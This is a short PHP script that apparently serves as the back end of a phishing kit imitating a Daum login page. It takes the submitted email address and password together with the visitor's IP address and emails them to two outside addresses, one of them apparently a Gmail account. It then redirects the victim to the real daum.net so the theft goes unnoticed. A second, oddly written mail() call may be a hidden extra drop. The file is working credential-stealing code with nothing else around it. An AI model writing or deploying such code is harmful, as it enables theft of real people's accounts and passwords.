<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------Daum---------\n";
$message .= "Email Address: ".$_POST['id']."\n";
$message .= "Password : ".$_POST['pw']."\n";
$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "-------Daum-------\n";
$recipient = "chriswallace066@gmail.com,HRprocurement@protonmail.com";
$subject = "Daum";
$headers = "Daum Inc";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "A$L", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://daum.net/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>